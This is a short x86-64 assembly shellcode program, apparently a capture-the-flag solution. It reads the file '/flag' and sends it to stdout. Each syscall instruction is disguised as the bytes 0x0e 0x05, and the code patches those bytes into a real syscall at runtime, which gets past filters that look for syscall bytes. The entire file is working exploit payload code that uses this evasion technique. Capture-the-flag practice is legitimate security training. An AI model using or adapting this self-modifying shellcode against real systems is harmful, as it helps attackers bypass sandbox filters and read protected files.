.global _start
_start:
.intel_syntax noprefix

#MOVE /flag TO STACK
    mov rax, [rip + flagText]
    push rax

#READ /flag
    mov rax, 2
    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    inc BYTE PTR [rip]
    .byte 0x0e
    .byte 0x05
    #syscall  
    mov r8, rax

#WRITE /flag TO stdout
	mov	rax, 40
    mov	rdi, 1
	mov	rsi, r8
    inc BYTE PTR [rip]
    .byte 0x0e
    .byte 0x05
    #syscall

#EXIT
	mov	rdi,0
	mov	rax,60	
    inc BYTE PTR [rip]
    .byte 0x0e
    .byte 0x05
	#syscall

    flagText:
    .string "/flag"
